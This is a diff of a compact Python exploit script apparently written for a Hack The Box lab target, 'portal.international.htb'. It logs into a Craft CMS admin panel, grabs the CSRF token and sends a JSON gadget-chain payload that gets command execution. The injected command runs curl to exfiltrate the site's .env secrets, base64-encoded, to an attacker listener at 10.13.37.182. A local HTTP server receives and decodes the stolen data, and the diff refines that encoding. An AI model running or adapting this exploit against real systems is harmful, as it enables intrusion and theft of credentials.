@@ -3,8 +3,12 @@ from http.server import BaseHTTPRequestHandler as BH,HTTPServer as HS
 B="http://portal.international.htb";L="10.13.37.182";P=9998
 class S(BH):
     def do_GET(s):
+        print("REQ:",s.path,flush=True)
         d=urllib.parse.urlparse(s.path).path[1:]
-        print(base64.b64decode(d+"="*(-len(d)%4)).decode(errors="replace"),flush=True)
+        d=d.replace("_","/").replace("-","+")
+        try:out=base64.b64decode(d+"="*(-len(d)%4)).decode(errors="replace")
+        except Exception as ex:out="decode failed: %s"%ex
+        print("OUT:",out,flush=True)
         s.send_response(200);s.end_headers()
     do_POST=do_GET
     def log_message(s,*a):pass
@@ -17,7 +21,7 @@ POST(B+"/admin/actions/users/login",urllib.parse.urlencode({"loginName":"jenny",
 m=re.search(r'csrfTokenValue"\s*:\s*"([^"]+)"',GET(B+"/admin"))
 if m:t=m.group(1)
 e="craft\\elements\\Category";k="craft\\elements\\conditions\\ElementCondition"
-c="curl -s http://%s:%d/$(%s|base64 -w0)"%(L,P,"cat /var/www/portal/.env")
+c="curl -s http://%s:%d/$(%s|base64 -w0|tr '/+' '_-')"%(L,P,"cat /var/www/portal/.env")
 b={"as rce":{"__class":"yii\\behaviors\\AttributeTypecastBehavior","__construct()":[{"attributeTypes":{"typecastAfterValidate":["Psy\\Readline\\Hoa\\ConsoleProcessus","execute"]},"typecastAfterValidate":["sh","-c",c]}]},"on *":"self::beforeSave"}
 p=json.dumps({"elementType":e,"siteId":1,"search":"","condition":{"class":k,"elementType":e,"fieldLayouts":[b]}}).encode()
 H={"Content-Type":"application/json","Accept":"application/json","X-CSRF-Token":t,"X-Requested-With":"XMLHttpRequest","Referer":B+"/admin"}
